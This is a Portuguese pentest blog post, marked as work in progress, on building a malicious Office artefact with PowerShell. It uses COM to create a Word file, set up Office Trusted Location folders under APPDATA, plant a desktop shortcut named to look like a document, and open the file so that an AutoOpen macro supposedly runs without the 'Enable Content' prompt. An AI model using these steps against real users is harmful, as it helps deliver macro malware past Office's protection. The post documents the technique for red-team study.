---
title: (wip) Artefato em Office via Powershell
author: Alan Lacerda
date: 2020-09-03 00:00:00 -0300
categories: [Pentest,Tricks]
tags: [wip, powershell, office, maldoc, redteam]
math: true
---

> Como o tema diz esse é um trabalho em progresso (wip) então, enquanto existir essa tag no cabeçalho não entenda como um post final.

Podemos manipular o office via powershell usando o COM (Component Object Model).

### Criando um arquivo .docx

```terminal
$word = New-Object -ComObject word.application
$doc = $word.Documents.Add()
$doc.SaveAs("D:\teste.docx")
$doc.Close()
$word.Quit()
```

### Descobrindo o APPDATA do usuario 
***
Por que eu preciso da variável APPDATA nesse contexto? O objetivo desse estudo é explorar o _Trusted Location_ do Office. E, até o momento, percebi que já existem alguns caminhos definidor por padrão no Office, e ele está em APPDATA.

```terminal
Write-Host $env:APPDATA
```

### Criando a árvore de diretórios
***
Agora que já sabemos como ler o APPDATA do usuário, podemos usar essa informação para criar o caminho pre-configurado no _Trusted Location_ (sim, ele está pre-definido no office, mas não está criado).

```terminal
New-Item -path $env:APPDATA"\Microsoft\Templates\"  -type directory
New-Item -path $env:APPDATA"\Microsoft\Word\Startup\"  -type directory
```

### Criando um atalho na área de trabalho
***
Por que preciso criar um atalho no contexto desse post? Bem, a intenção é criar o artefato no _Trusted Locarion_ mas criar um atalho no Desktop apontando para esse arquivo.

```terminal
$WshShell = New-Object -ComObject WScript.Shell
$link = $WshShell.CreateShortcut("$HOME\Desktop\dark.doc.lnk")
$link.TargetPath = "D:\teste.docx"
$link.Save()
```

### Bypass da proteção de execução de Macros
***
~Acidentalmente~ descobri que, se abrir-mos o documento contendo uma macro AutOpen() via powershell, ele será automaticamente executado bypassando a proteção do office (onde o usuário precisa primeiro clicar em "Habilitar Conteúdo"). Para abrir o documento via _Powershell_:

```terminal
$word = New-Object -ComObject word.application
$f = "D:\teste.docx"
$df = $word.Documents.Open($f)
```